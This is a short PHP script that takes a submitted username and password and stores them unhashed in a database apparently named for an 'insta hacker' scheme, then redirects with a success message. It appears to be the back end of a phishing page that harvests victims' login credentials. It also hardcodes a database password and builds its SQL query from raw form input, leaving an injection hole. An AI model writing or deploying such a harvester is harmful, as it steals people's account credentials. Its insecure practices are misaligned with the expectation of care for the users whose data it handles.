<?php

// Username and Password
$username = $_POST['username'];
$password = $_POST['password'];

// Connect To DB
$DB_HOST = "localhost";
$DB_NAME = "netfarmzcom_instahacker";
$DB_USER = "netfarmzcom_main";
$DB_PASS = "R3cH7tE2rN9pU6d";

$conn = new mysqli($DB_HOST, $DB_USER, $DB_PASS, $DB_NAME);

$conn->query("INSERT INTO Users (username, password)
VALUES ('$username', '$password')");

header('Location: index.php?message=success');